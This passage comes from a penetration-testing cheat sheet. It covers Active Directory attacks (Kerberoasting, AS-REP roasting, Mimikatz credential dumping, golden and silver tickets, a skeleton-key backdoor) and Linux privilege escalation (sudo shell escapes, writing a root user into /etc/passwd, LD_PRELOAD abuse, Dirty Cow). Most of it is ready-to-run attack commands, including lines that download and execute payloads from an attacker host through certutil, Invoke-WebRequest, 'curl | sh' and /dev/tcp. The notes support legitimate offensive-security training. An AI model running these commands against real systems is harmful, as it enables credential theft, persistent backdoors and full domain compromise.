    AS-REP Roasting - Access as any user required
    Golden Ticket - Full domain compromise (domain admin) required 
    Silver Ticket - Service hash required 
    Skeleton Key - Full domain compromise (domain admin) required

[Back to Top](#table-of-contents)

### Kerbrute

Tags: [[#KERBEROS]], [[#Asrep-Roast]], [[#Kerberos-Roast]], [[#Winrm]], [[#Evil-Winrm]]

Tool used to enumerate on __usernames__ and __passwords__ on a Kerberos service by abusing the Kerberos pre-authentication

```powershell
#OPTIONS
    $USERS				:list of usernames to spray
    $PASSWORDS			:list of passwords to spray
    $RHOST				:Domain controller IP
    $DOMAIN				:Domain i.e spookysec.local or example.com
    $FILEout			:Name of output file
    
    -bruteuser			:Bruteforce a single users password from a wordlist
    -bruteforce			:Read username:password combos from a file or stdin and test them
    -passwordspray		:Test a single password against a list of users
    -userenum			:Enumerate valid domain usernames via Kerberos

#USAGE
    kerbrute userenum --dc $RHOST -d $DOMAIN $USERS -o $FILEout 
```

[Back to Top](#table-of-contents)

### Asrep-Roast:

Tags: [KERBEROS](#KERBEROS), [Kerbrute](#Kerbrute), [Kerberos-Roast](#Kerberos-Roast), [Winrm](#Winrm), [Evil-Winrm](#Evil-Winrm), [Impacket](#Impacket), [Rubeus](#Rubeus), [CrackMapExec](#CrackMapExec)

RID bruteforcing to confirm valid usernames and see if there are hashes available due to pre-authentication rules. If available this may lead to hashes that we can later use towards pass-the-hash.

Firstly, we check SMB  for shares available using tools such as [CrackMapExec](#CrackMapExec) or [Enum4Linux](#Enum4Linux) or [SMBclient](#SMBclient):

> - If `IPC$` with __read__ access means we can __RID BRUTEFORCE__ to enumerate on usernames
> - Kerberos has a setting called __pre-authentication__; with kerberos being a ticket-based authentication, you need to authenticate yourself to get a ticket and with that ticket you can then gain access to some service. 

Pre-authentication means you __don't__ need to provide authentication prior to getting a ticket and  leads to asrep roasting.

**ASREP ROAST:**

Tags: [Impacket](#Impacket) - Refer to Impacket Notes for up to date information

Only requires __valid__ users, or valid credentials. \
This may return with a user that does not have __UF-DONT_REQUIRE_PREAUTH__ by default

```powershell
#OPTIONS
    $DOMAIN				:i.e spookysec.local
    $FULLDNSDOMAINNAME	:full qualified name i.e AttacktiveDirectory.spookysec.local
    $USER				:user with pre-auth access i.e backup

#USAGE
    impacket-GetNPUsers -format hashcat -dc-ip $RHOST -usersfile $FILEusers $DOMAIN/$NETBIOSNAME
    impacket-secretsdump $FULLDNSDOMAINNAME/$USER@$RHOST
```

Tags: [Rubeus](#Rubeus) - Refer to Impacket Notes for up to date information

```powershell
#SETUP
    sudo python SimpleHTTPServer 80                                    :[attacker] Setup server in directory to feed file on port 80
    certutil -urlcache -f http://$RHOST/rubeus.exe %tmp%/rubeus.exe    :[victim] Transfer file to victim, place in %tmp% folder

#RUN
    rubeus.exe $OPTION :i.e kerberoast, asreproast, harvest, brute
    
    rubeus.exe kerberoast		               :Dump the hash of any kerberoastable users
    rubeus.exe asreproast	                   :Look for vulnerable users then dump their user hashes
    rubeus.exe harvest /interval:30            :Harvesting TGT
    rubeus.exe brute /password:$PASS /noticket :Password spraying, REQUIRED: domain name added to host file 'echo $IP $DOMAIN >> C:\Windows\System32\drivers\etc\hosts'
```

[Back to Top](#table-of-contents)

### Kerberos-Roast

Tags: [KERBEROS](#KERBEROS), [Kerbrute](#Kerbrute), [Asrep-Roast](#Asrep-Roast), [Winrm](#Winrm), [Evil-Winrm](#Evil-Winrm), [Impacket](#Impacket)

Kerberoasting **requires valid credentials**. \
If you are successful is obtaining access to a Service Account then you need to determine if it is a *domain admin* or not.\ 
If it is; then you have control similar to a golden/silver ticket and can gather info such as dumping the **NTDS.dit**.

If it is not a domain admin, then you can pivot by logging into other systems or escalate/password spray and such across all the accounts.

**Mitigating Kerberoasting:**
> - Strong Service Passwords
> - Don't make Service Accounts Domain admins

**METHOD ONE - RUBEUS:**

Tags: [Rubeus](#Rubeus) - Refer to tag for updated info.

Using Rubeus to kerberoast. Rubeus is also able to enumerate further details.\ 
Note: Tool is *uploaded* and *run directly from target*.

```powershell
#SETUP
    sudo python SimpleHTTPServer 80                                    :[attacker] Setup server in directory to feed file on port 80
    certutil -urlcache -f http://$RHOST/rubeus.exe %tmp%/rubeus.exe    :[victim] Transfer file to victim, place in %tmp% folder

#RUN
    rubeus.exe $OPTION :i.e kerberoast, asreproast, harvest, brute
    
    rubeus.exe kerberoast		               :Dump the hash of any kerberoastable users
    rubeus.exe asreproast	                   :Look for vulnerable users then dump their user hashes
    rubeus.exe harvest /interval:30            :Harvesting TGT
    rubeus.exe brute /password:$PASS /noticket :Password spraying, REQUIRED: domain name added to host file 'echo $IP $DOMAIN >> C:\Windows\System32\drivers\etc\hosts'
```

**METHOD TWO - IMPACKET:**

Tags: [Impacket](#Impacket) - See tag for updated information

Using impacket scripts that is run directly on the attacker host machine.  **Dump Kerberos Hash** for all kerberoastable accounts it can find on the target domain.

```powershell
#OPTIONS
    -dc-ip				:Domain controller ip
    $FULL DOMAIN NAME	:Requires the fully qualified domain name
    -request			:Request service ticket - Produce a hash, encrypted service ticket (TGS); cannot use ticket but can crack it.

#USAGE
    sudo impacket-GetUserSPNs -dc-ip $RHOST "$FULL DOMAIN NAME/$USERNAME"
    sudo impacket-GetUserSPNs -dc-ip $RHOST -request "$FULL DOMAIN NAME/$USERNAME"
    sudo impacket-GetUserSPNs -dc-ip $RHOST -request $DOMAIN/$USER:$PASS` 				: calling directly the domain/user/password obtained
```

**METHOD THREE - EMPIRE:**

```powershell
#Enumeration for Kerberoast
    setspn -T medin -Q ​ */*                                :Display SPN Service Principal Name, extracts all accounts in the SPN
    iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
    Invoke-Kerberoast -OutputFormat hashcat |fl
```

[Back to Top](#table-of-contents)

### Winrm

Tags: [CrackMapExec](#CrackMapExec), [Evil-Winrm](#Evil-Winrm), [Active Directory](#Active%20Directory), [KERBEROS](#KERBEROS), [Asrep-Roast](#Asrep-Roast)

Once you have successful username/passwords/hash that you want to attempt to use, you can confirm access with admin privileges and even attempt to run some commands

**NOTES:**

> `winrm` is windows remote manager and is usually only available to be used with admin privileges; sometimes services or higher priv users have access to this as well so it is worth trying


```powershell
#OPTIONS
    $HASH      :able to pass the hash directly instead of cracking it
    -u ''      :Username i.e Administrator
    -p ''      :Password
    -d $DOMAIN :specify the domain i.e company.local
    -x or -X   :Execute command, -x for CMD and -X for powershell
    
#USAGE
    crackmapexec winrm $RHOST -u '' -p ''              :Null Login
    crackmapexec winrm $RHOST -u '' -p '' -x whoami    :Null login, execute command 'whoami'
    cme winrm $RHOST -u '' -H $HASH -d $DOMAIN -X 'Invoke-WebRequest "http://$LHOST:LPORT/$PAYLOAD.exe" -OutFile "$PAYLOAD1.exe" && cmd /c $PAYLOAD1.exe'  :Download payload & execute
    cme winrm $RHOST -u '' -H $HASH -d $DOMAIN -x 'Certutil -urlcache -f http://$LHOST:LPORT/$PAYLOAD.exe $PAYLOAD1.exe && cmd /c $PAYLOAD1.exe'           :Download payload & execute
```

[Back to Top](#table-of-contents)

### Evil-Winrm

Tags: [CrackMapExec](#CrackMapExec), [Active Directory](#Active%20Directory), [Asrep-Roast](#Asrep-Roast), [Winrm](#Winrm), [Kerberos-Roast](#Kerberos-Roast), [Kerbrute](#Kerbrute), [KERBEROS](#KERBEROS)

Become a pseudo shell and navigate the system. Once you know you have access to an account, and winrm is successful, sometimes this is not enabled for users, then you can proceed to using evil-winrm to exploit the system and navigate for sensitive data.

```powershell
#OPTIONS
    $HASH     :able to pass the hash directly instead of cracking it
    -i $RHOST :Target IP
    -u '$USER'     :Username
    -p '$PASS'     :Password

#USAGE
    evil-winrm -i $RHOST -u '' -p ''     : Login
    evil-winrm -u '' -H $HASH -i $RHOST  :Pass hash
```

[Back to Top](#table-of-contents)

### Rubeus

Tags: [Asrep-Roast](#Asrep-Roast), [KERBEROS](#KERBEROS), [Kerberos-Roast](#Kerberos-Roast), [Active Directory](#Active%20Directory)

Rubeus is an *uploaded* tool that is run directly from the target. It's features center around attacking Kerberos and include: overpass the has, ticket requests & renewals, ticket management, ticket extraction, pass the ticket, harvesting, ASREP roasting and Kerberoasting.

```powershell
#SETUP
    sudo python SimpleHTTPServer 80                                    :[attacker] Setup server in directory to feed file on port 80
    certutil -urlcache -f http://$RHOST/rubeus.exe %tmp%/rubeus.exe    :[victim] Transfer file to victim, place in %tmp% folder

#RUN
    rubeus.exe $OPTION :i.e kerberoast, asreproast, harvest, brute
    
    rubeus.exe kerberoast		               :Dump the hash of any kerberoastable users
    rubeus.exe asreproast	                   :Look for vulnerable users then dump their user hashes
    rubeus.exe harvest /interval:30            :Harvesting TGT
    rubeus.exe brute /password:$PASS /noticket :Password spraying, REQUIRED: domain name added to host file 'echo $IP $DOMAIN >> C:\Windows\System32\drivers\etc\hosts'
```

[Back to Top](#table-of-contents)

### Mimikatz

Tags: [Active Directory](#Active%20Directory), [KERBEROS](#KERBEROS), [Windows-Privilege-Escalation](#Windows-Privilege-Escalation), [Pass-The-Ticket](#Pass-The-Ticket), [Golden Silver-Tickets](#Golden%20Silver-Tickets), [Kerberos-Backdoor](#Kerberos-Backdoor)

Tool commonly used for dumping user credentials inside an active directory network. Mimikatz can also be used for dumping a Ticket Granting Ticket (TGT) from the Local Security Authority Subsystem Service (LSASS) memory. LSASS is a memory process storing creds on a AD network as well as storing Kerberos tickets with other cred types to act as the gatekeeper accepting or rejecting the credentials provided. 

```powershell
#Note ensure you run 32bit or 64bit based on architecture

#SETUP
    sudo python SimpleHTTPServer 80                                        :[attacker] Setup server in directory to feed file on port 80
    certutil -urlcache -f http://$RHOST/mimikatz.exe %tmp%/mimikatz.exe    :[victim] Download file from attacker server, place in %tmp% folder

#COMMANDS
    /patch						:Dump all users NTLM hashes
    %tmp%/mimikatz.exe			:Initialise and run program
    lsadump::lsa /patch			:
    privilege::debug			:
    sekurlsa::kerberos			:
    sekurlsa::logonpasswords	:Dump logon passwords
    kerberos::ptt $TICKET		:Indicate the ticket you are using to impersonate, i.e the administrators base64 encoded tickets harvested with Rubeus.
    klist									:verify to check if successfully impersonated.
```

[Pass-The-Ticket](#Pass-The-Ticket)

Dumping tickets with Mimikatz will give you a `.kirbi` ticket that is used to obtain domain admin access **if** a domain admin ticket is in the LSASS memory.  
Mimikatz required to be run as admin; without admin privs then the tool will not work properly. The tool is run directly from the target host.

```powershell
#SETUP
    sudo python SimpleHTTPServer 80                                        :[attacker] Setup server in directory to feed file on port 80
    certutil -urlcache -f http://$RHOST/mimikatz.exe %tmp%/mimikatz.exe    :[victim] Download file from attacker server, place in %tmp% folder

#PASS THE TICKET
    %tmp%/mimikatz.exe						:Initialise and run program
    privilege::debug 						:Check if output = '20' OK - otherwise you dont have admin privs to run properly.
    sekurlsa::tickets /export				:Export all .kirbi tickets into the directory you are in.
    kerberos::ptt $TICKET					:Indicate the ticket you are using to impersonate, i.e the administrators base64 encoded tickets harvested with Rubeus.
    klist									:verify to check if successfully impersonated.
```

Mitigating this attack: Don't let domain admins log onto lower-level computers and leaving tickets around that can be used to attack and move laterally.

[Back to Top](#table-of-contents)

#### Golden-Silver-Tickets

Tags: [Mimikatz](#Mimikatz), [Windows-Privilege-Escalation](#Windows-Privilege-Escalation), [Pass-The-Ticket](#Pass-The-Ticket), [KERBEROS](#KERBEROS)

__Note:__ This attack only works on a network such as a Active Directory network with other machines on the domain. It will not work without other machines.

Silver tickets can sometimes be used in engagements when you are looking to be discreet whereas Golden tickets are much more noisy.\ 
The approach to creating one is exactly the same for both. Silver tickets are limited to the service that is targeted: For example you might want to access the domain's SQL server however\
the compromised user does not have access;  you can find an accessible service account to get a foothold by Kerberoasting that service,\ 
dump the service hash then impersonate their TGT in order to request a service ticket for the SQL service and the KDC providing you access to the SQL server.

Golden tickets has access to any Kerberos service. This works by dumping the TGT of a user on the domain such as a domain admin. 

Difference here is for:
> - Golden ticket you dump the __krbtgt__ ticket 
> - Silver ticket you dump any service or domain admin ticket.

```powershell
#SETUP
    sudo python SimpleHTTPServer 80                                        :[attacker] Setup server in directory to feed file on port 80
    certutil -urlcache -f http://$RHOST/mimikatz.exe %tmp%/mimikatz.exe    :[victim] Download file from attacker server, place in %tmp% folder

#OPTIONS
    privilege::debug					:Check if output = '20' OK - otherwise you dont have admin privs to run properly.
    lsadump::lsa /inject /name:krbtgt	:Dump hash, username and SID - security identifier for Golden Ticket
    /name:								:Golden: krbtgt, Silver: Domain admin or Service Account name i.e SQLService
    $USER:								:User: Administrator, Service account
    $DOMAIN:							:Domain
    $SID:								:SID i.e S-1-5-21-8420856-####-###
    $HASH:								:Golden: krbtgt hash
    $NTLM:								:Silver: ntlm hash of domain admin/service account target.
    $ID:								:Silver: 1103, Golden: User ID as per lsadump, in the even hundreds i.e 500, 600 etc.
    misc::cmd							:Open elevated command prompt

#RUN
#Note ensure you run 32bit or 64bit based on architecture
    mimikatz.exe
    privilege::debug
    lsadump::lsa /inject /name:krbtgt
    kerberos::golden /user:$USER /domain:$DOMAIN /sid:$SID /krbtgt:$HASH /id:$ID	# GOLDEN ticket
    kerberos::golden /user:$USER /domain:$DOMAIN /sid:$SID /krbtgt:$NTLM /id:1103	# SILVER ticket
    misc::cmd
```

[Back to Top](#table-of-contents)

#### Kerberos-Backdoor

Tags: [Mimikatz](#Mimikatz), [KERBEROS](#KERBEROS), [Active Directory](#Active%20Directory)

__Note:__ By itself the skeleton key will not persist as it resides in memory. Other techniques are needed to provide persistence.

Mimikatz can also implant, similar to a rootkit, into the memory of the domain forest allowing itself access to any of the machines with a master password.

Specifically it abuses the way the AS-REQ validates encrypted timestamps. These timestamps are encrypted with the users NT hash which the Domain Controller then tries to decrypt it. Once a skeleton key is implanted then the Domain Controller tires to decrypt the timestamp using both the user NT hash as well as the skeleton key NT hash; thus allowing you access to the domain forest.

The 'skeleton key' only works using Kerberos RC4 encryption.

__Default__ hash for Mimikatz skeleton key is `60BA4FCADC466C7A033C178194C03DF6` that has password = `mimikatz`

```powershell
#SETUP
    sudo python SimpleHTTPServer 80                                        :[attacker] Setup server in directory to feed file on port 80
    certutil -urlcache -f http://$RHOST/mimikatz.exe %tmp%/mimikatz.exe    :[victim] Download file from attacker server, place in %tmp% folder

#OPTIONS
    privilege::debug	:Check if output = '20' OK - otherwise you dont have admin privs to run properly.
    $SKELETONPass		:The password associated with the skeleton NT hash, default is mimikatz
    net user			:Example of accessing share without need for Admin password
    dir					:Example of accessing directory without know what users can or cant access this computer i.e Desktop-1
    $DOMAINCONTROLLER   :Full qualified name of domain controller

#RUN
    mimikatz.exe
    privilege::debug	                                                       :Check if output = '20' OK - otherwise you dont have admin privs to run properly.
    misc::skeleton		                                                       :Initialises the backdoor with the skeleton key NT hash
    net user C:\\$DOMAINCONTROLLER\admin$ /user:Administrator $SKELETONPass
    dir \\Desktop-1\c$ /user:Machine1 $SKELETONPass                            
```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## POWERVIEW

Tags: [Active Directory](#Active%20Directory),

Powershell script from Powershell Empire that can be used to enumerate domains __after you have already gained a shell__ in the system. The script is run directly from the target host.

- Link to  [Powerview Cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
- Link to  [Up-to-date Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

```powershell
#OPTIONS
    Get-NetUser | select cn									:Enumerate domain users, display only the names
    Get-NetGroup											:Enumerate domain groups
    *admin*													:Wildcard searching to include anything that has "admin" within the group names.
    Invoke-ShareFinder										:Similar to enum4linux, display the share folders.
    Get-NetComputer			                                :Displays the OS info, might include more than what systeminfo does
    Get-NetComputer -fulldata | select operatingsystem

#RUN
    powershell -ep bypass	:Bypass execution policy to easily run scripts
    %tmp%\powerview.ps1     :Run script
```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## BLOODHOUND

Tags: [Active Directory](#Active%20Directory), [KERBEROS](#KERBEROS)

Important to note that Bloodhound requires __credentials__ before enumerating with.

**RUN INTERNALLY - SHARPHOUND:**

Run from __target__, With bloodhound there are typically two ways to run it and usually on a real internal pentest, you would be running the bloodhound model from within the domain controller after it has been breached.\
__sharphound.exe__ would be used from the target host to enumerate information and save the details to JSON files. These files would then be uploaded to bloodhound where it would collate it.

```powershell
#SETUP
    sudo python SimpleHTTPServer 80                                            :[attacker] Setup server in directory to feed file on port 80
    certutil -urlcache -f http://$RHOST/sharphouse.ps1 %tmp%/sharphouse.ps1    :[victim] Download file from attacker server, place in %tmp% folder

#OPTIONS
    -CollectionMethod All		        :Collect all data
    -Domain $DOMAIN						:Set Domain
    -ZipFileName $FILE					:Set name of zipfile compiled

#RUN
    %tmp%\sharphouse.ps1
    Invoke-Bloodhound -CollectionMethod All -Domain $DOMAIN -ZipFileName $FILE

#EXTRACT ZIP
    scp $USER@$RHOST:$FILEpath $SAVElocation -P $PORT      :Download file from remote host

```

**RUN EXTERNALLY - PYTHON**

Will either need a connection or pivot to be connected. If you want to run bloodhound while not having access to the internal system yet and use **sharphound.exe**; then you will be using the python version `bloodhound-python`


```powershell
#OPTIONS
    -c $OPTION                                           :Collection method Options: 'All' (loud), 'DcOnly' (quieter)  
    -u $USER                                             :Valid Username
    -p $PASS                                             :Valid Password
    -gc  $NETBIOSNAME.$DOMAIN.local                      :Global Catalogue
    -dc $DNSNAME.$DOMAIN.local                           :Domain controller qualified name 
    -d $DOMAIN.local                                     :Domain
    -ns $RHOST                                           :Nameserver
    
    bloodhound-python -c All -u '$USER' -p '$PASS' -gc '$NETBIOSNAME.$DOMAIN' -dc '$DNSNAME.$DOMAIN' -d '$DOMAIN' -ns $RHOST  
```

**ANALYSE DATA**

Now you can proceed to start up the database and run bloodhound.

> - `sudo neo4j console` to startup the database
> - `clear database`
> - `upload data` and select all JSON files or the ZIP format if you use the sharphound.exe as it will create a zip automatically
> - `mark our user as Own3d` as we have credentials for this user already
> - `analysis/find shortest path to domain admin` 

```powershell
#OPTIONS
    find AS-REP Roast									:shows AS-REP roastable users
    list all Kerberoastable Accounts					:Shows kerberoast targets, KRBTGT is always going to be roastable but never want to kerberoast as its pointless.
    find computers where Domain Users as Local Admin
    find Principals with DCSync Rights					:domain admins always have DCSync rights 
```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------


# Linux-Privilege-Escalation

Tags: [Common-OS-File-locations](#Common-OS-File-locations), [linPEAS](#linPEAS), [SSH-Private-Public-Keys](#SSH-Private-Public-Keys), [Weak-File-Permissions](#Weak-File-Permissions), [Sudo-Shell-Escapes](#Sudo-Shell-Escapes), [Sudo-Variables](#Sudo-Variables), [Kernel-Exploitation](#Kernel-Exploitation), [NMAP-Root-Shell](#NMAP-Root-Shell), [SUID-or-SGID](#SUID-or-SGID), [Capabilities](#Capabilities), [Cron-Jobs](#Cron-Jobs), [PATH](#PATH), [Service-Exploits](#Service-Exploits), [NFS-Network-File-Sharing](#NFS-Network-File-Sharing), [Passwords-and-Keys](#Passwords-and-Keys),

------------------------------------------------------------------------------------------------------------------------------------------------------

All about escalating privileges to get from a lower-privilege user up to super users.\
Don't forget to look at the low-hanging fruit such as `sudo -l` to see what the user can run with sudo.

> For example, being able to run `less`, `nano`, `find` etc can end up being able to access and read files such as `/etc/shadow` even without privileges on the user

## linPEAS

Tags:  [SSH-Private-Public-Keys](#SSH-Private-Public-Keys), [Weak-File-Permissions](#Weak-File-Permissions), [Sudo-Shell-Escapes](#Sudo-Shell-Escapes), [Sudo-Variables](#Sudo-Variables), [Kernel-Exploitation](#Kernel-Exploitation), [NMAP-Root-Shell](#NMAP-Root-Shell), [SUID-or-SGID](#SUID-or-SGID), [Capabilities](#Capabilities), [Cron-Jobs](#Cron-Jobs), [PATH](#PATH), [Service-Exploits](#Service-Exploits), [NFS-Network-File-Sharing](#NFS-Network-File-Sharing)

Script to auto scan for escalation privileges, purely for scanning and not automated vulnerability exploits. The script itself needs to run on the host target you are wanting to scan.

> - LinPEAS is for linux based systems
> - WinPEAS is for windows based systems

```powershell
#OPTIONS
-
#TRANSFER SCRIPT
    sudo python SimpleHTTPServer 80                                        :[attacker] Setup server in directory to feed file on port 80
    curl $RHOST/linpeas.sh | sh
    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
    wget $RHOST/linpeas.sh
    scp $LOCALfilepath $USER@$RHOST:/tmp/

    sudo nc -q 5 -lvnp $RPORT < linpeas.sh
    cat < /dev/tcp/$RHOST/$RPORT | sh

#BINARY OPTION
    wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
    chmod +x linpeas_linux_amd64
    ./linpeas_linux_amd64
    
```

## SSH-Private-Public-Keys

Tags: [Common-OS-File-locations](#Common-OS-File-locations), [Common-Shell-Payloads](#Common-Shell-Payloads), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Windows-Privilege-Escalation](#Windows-Privilege-Escalation), 
[linPEAS](#linPEAS), [Weak-File-Permissions](#Weak-File-Permissions), [Sudo-Shell-Escapes](#Sudo-Shell-Escapes), [Sudo-Variables](#Sudo-Variables),  [NMAP-Root-Shell](#NMAP-Root-Shell), [SUID-or-SGID](#SUID-or-SGID), [Capabilities](#Capabilities), 
[Cron-Jobs](#Cron-Jobs), [PATH](#PATH), [Service-Exploits](#Service-Exploits), [CrackMapExec](#CrackMapExec)

Finding another users `id_rsa` file through SSH and system exploration may lead to being able to crack their password hash and then login as them through ssh.\
By getting the key, we can use **ssh2john** to convert it to its hash format and use something like john or hashcat to crack the password. Then using this password and the id_rsa key; we can login as that user who may have higher privileges

SSH can use **Asymmetric cryptography** requiring *two* keys for authentication. The public key comes from using a mathmatically algorithm on the private key, this produces the public key but due to the complexity,\
you would not be able to have the **public key** go back to the private key. Thus the **private key** is kept private and the public key can be provided to someone else.

|                                                       | Description                                                                                                      |
|:----------------------------------------------------- |:--------------------------------------------------------------------------------------------------------------- |
| @ **Syntax**                                          | ---                                                                                                             |
| `~/usr/share/john/ssh2john.py {id_rsa_key.txt}`       | Using john to covert private id_rsa key to hash format                                                          |
| `./hascat.exe -a 0 -m 22931`                          | ssh hashmode 22931                                                                                              |
|                                                       |                                                                                                                 |
| @ **Logging in**                                      | ---                                                                                                             |
| `chmod 600 {id_rsa}`                                  | remember to set permissions on a id_rsa file prior to using to log in, SSH doesn't like other chmod permissions |
| `ssh -i {path/to/saved_rsa_key.txt} user@10.10.10.10` | `-i {rsa_key}` to specify the private key before logging in                                                     |
|                                                       |                                                                                                                 |
| @ **Generate Public id_rsa**                          | ---                                                                                                             |
| `ssh-keygen` `/{username}_rsa`                        | Run ssh-keygen to produce **both public/private key**, choose name based on user. No passphrase needed          |
| `ssh-keygen -y -f id_rsa > id_rsa.pub`                | Generate public id_rsa file based on the private one or download/copy to the .ssh directory                     |
| =========================================             | =========================================                                                                       |

**Notes:**

>  - Sometimes by having the rsa_key, we can attempt to login `ssh -i {rsa_key_file.txt}` and see if we can connect without password requirements
> - **ID_RSA.PUB** can normally have a username at the bottom of the file.
> - `ssh` only likes `chmod 600` permissions on private keys. It doesn't like it if the file allows other users to operate on the file. So it is essential to make the file fall in line with the **SSH requirements**

> **Uploading id_public.rsa for SSH Connection**
> -
> - Using `ssh-keygen` we can create a public/private pair; if we have the ability to upload files such as through a `rsync` or similar methods, then we can upload a **public** key
> - We would upload the **public key** to `{path/to/.ssh}/authorized_keys` and we copy that rsa.pub file into `authorized_keys`
> - Then using the private key with `ssh -i {key_rsa} {username}@{ip address}`

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Weak-File-Permissions

Tags: [Common-OS-File-locations](#Common-OS-File-locations),

From enumeration if you are able to determine that the `/etc/passwd` file is writeable; find out which permissions are set. Can a normal user write? Can a root group write? and so forth

Then if you inspect the content of the `/etc/passwd` and you find a user that is included with **root group** or has access to writing to this file then we can add our own root user.

**METHOD - WEAK /etc/passwd**

> - `ls -la /etc/passwd` to view permissions
> - `cat /etc/passwd` to view users and their permissions
> - `openssl passwd -1 -salt {salt} {password}` i.e `openssl passwd -1 -salt new 123`
> - `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`
> - `echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd`
> - `su new` and prompt password `123` to login to super user

> Alternative `openssl passwd password123`
> Place this has in the `/etc/passwd` and replace the first `x` in root user between the first and second colon (:)

**METHOD - WEAK /etc/shadow**

> - `mkpasswd -m sha-512 password123`
> - `$6$FkrtXyIIPzsUX05X$M/tqMC9Y1ewb1olfoYaPKswblzU9kzgbGIQXXqA2Sd.J/6UvRdRcHA.v85.jQNkNURA9Q/fiF6ITf9p/s1MDz.` replaced in Roots password
> - `su root` with new password


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Sudo-Shell-Escapes

Tags: [Common-OS-File-locations](#Common-OS-File-locations), 

After determining with `sudo -l` that your user has the ability to run specific programs as root, specifically the `vi` editor; by escaping this editor we can proceed to a root shell.

> - Refer to [https://gtfobins.github.io/](https://gtfobins.github.io/) to reference what you might be able to use as well
> - Running the programs as sudo means you **did not require root password**

```powershell
#SEE PROGRAMS
    sudo -l          :Determine what tools user can run as 'sudo'

#MISCONFIGURED PROGRAMS refer to [https://gtfobins.github.io/](https://gtfobins.github.io/)
#VI
    sudo vi
    :!sh

#IFTOP
    sudo iftop
    !/bin/bash

#FIND
    sudo find /home -exec /bin/bash \;

#NANO
    sudo nano
    ^R^X
    reset; sh 1>&0 2>&0

#VIM
    sudo vim -c '!sh'

#MAN
    sudo man man
    !/bin/bash

#AWK
    sudo awk 'begin {system("/bin/sh")}'

#LESS
    sudo less /etc/hosts
    !/bin/bash

#FTP
    sudo ftp
    !/bin/bash

#NMAP
    echo “os.execute(‘/bin/sh’)” > shell.nse && sudo nmap --script=shell.nse

#MORE
    TERM= sudo more /etc/profile
    !/bin/sh

#APACHE2
    sudo apache2 -f /etc/shadow       :Returns error but prints the 'first line' in document, in this case prints user 'root' who is first in /etc/shadow document

```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Sudo-Variables
Tags: [Common-OS-File-locations](#Common-OS-File-locations)

Use `sudo -l` to display which environmental variables **we have inherited** from the users environment

Specifically, looking for `env_keep` such as `env_keep+=LD_PRELOAD` and `env_keep+=LD_LIBRARY_PATH`

> - **LD_PRELOAD:** loads a shared object before any others when a program is run.
> - **LD_LIBRARY_PATH:** provides a list of directories where shared libraries are searched for first.

Using a payload or code you can create shared objects

```powershell
#ENVIRONMENTAL VARIABLES
    sudo -l               :Determine variables we have inherited from users environment

#METHOD LD_Preload
    $PROGRAM              :Name of program gathered from running 'sudo -l' such as vim, nano

    gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c      
    sudo LD_PRELOAD=/tmp/preload.so $PROGRAM

#METHOD LD_Library
    ldd /usr/sbin/apache2
    gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
    sudo LD_LIBRARY_PATH=/tmp apache2
```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------


## Kernel-Exploitation

Tags: [Common-OS-File-locations](#Common-OS-File-locations), [NC-Netcat](#NC-Netcat), [Common-Shell-Payloads](#Common-Shell-Payloads), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Webshells](#Webshells),  [Windows-Privilege-Escalation](#Windows-Privilege-Escalation)

Pretty self explanatory in that you are looking at the kernel version for the system you are targeting and searching for a relevant exploit.\

This could lead to rabbit holes and time wasting as there may or may not be a functioning kernel exploit. 

The topic on Kernel exploitation is large and is all about finding something through searching through github and google. There is no one-trick.

**Should only be used as a last resort**

> **Linux Exploit Suggester 2**
> - 
> - `wget "https://github.com/jondonas/linux-exploit-suggester-2/raw/master/linux-exploit-suggester-2.pl"`
> - `perl /directory/linux-exploit-suggester-2.pl` to run tool on target host
> 
> **Dirty Cow**
> - `wget "https://www.exploit-db.com/raw/40616" -O c0w.c` to save output to c0w.c file
> - `gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w ./c0w`
> - `/usr/bin/passwd` to run exploited file and gain root shell

|                   | Desciption                                                           |
| :---------------- | :------------------------------------------------------------------- |
| @ **System Info** | ---                                                                  |
| `uname -a`        | Info on **kernel** used by system                                    |
| `/proc/version`   | **kernel version** and whether **compiler such as GCC** is installed |
| `/etc/issue`      | Info on OS identification                                            |


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## NMAP-Root-Shell

Tags: [Common-OS-File-locations](#Common-OS-File-locations), [NC-Netcat](#NC-Netcat), [Common-Shell-Payloads](#Common-Shell-Payloads), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Webshells](#Webshells)

If the user has Sudo capabilities with NMAP then it may be possible to spawn a root shell with nmap.

> - `sudo nmap --interactive` or `nmap --interactive`
> - `nmap> !sh` or `!bash`
> - check with `id`

While this may work on older versions but the following will also work as an nmap script:

> `echo "os.execute('/bin/sh')" > /tmp/shell.nse`
> `sudo nmap --script=/tmp/shell.nse`
> Check with `id`

[Back to Top](#table-of-contents)


------------------------------------------------------------------------------------------------------------------------------------------------------

## SUID-or-SGID

Tags: [Common-OS-File-locations](#Common-OS-File-locations), [NC-Netcat](#NC-Netcat), [Common-Shell-Payloads](#Common-Shell-Payloads), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Webshells](#Webshells)

